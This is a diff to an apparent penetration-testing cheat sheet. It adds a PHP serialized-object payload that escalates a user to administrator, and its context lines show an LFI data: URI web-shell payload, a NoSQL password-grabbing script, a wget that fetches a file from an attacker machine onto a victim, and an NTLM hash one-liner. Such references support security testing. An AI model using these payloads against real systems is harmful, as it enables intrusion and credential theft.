@@ -47,6 +47,7 @@
   - [Local File Inclusion (LFI)](#local-file-inclusion-lfi-payloads)
   - [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
   - [Structured Query Language injection (SQLi)](#sql-injection-payload-list)
+  - [Insecure deserialization](#insecure-deserialization)
 
 ### Linux
  - [Basic enumeration](#basic-enumeration-on-linux-and-windows)
@@ -1046,7 +1047,7 @@ http://www.test.com.ar/main.php?pagina=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7
 # Nosql
 
 ### Grab password with JSON post request
-```
+```python
 import json
 import requests
 import string
@@ -1078,8 +1079,12 @@ while stop == False:
 
 
 
+# Insecure deserialization
 
-
+### Modifying serialized data types
+```js
+O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+```
 
 
 
@@ -1453,7 +1458,7 @@ python -m SimpleHTTPServer
 ```
 
 *download the `apline-v3.10-x86_64-someting.tar.gz` file to victim machine*
-```shell
+```bash
 cd /tmp
 wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz
 ```
@@ -1902,7 +1907,7 @@ download remote_filename (destination_filename)
 
 ### make NTML hash from password
 
-```
+```bash
 python -c 'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
 ```
 
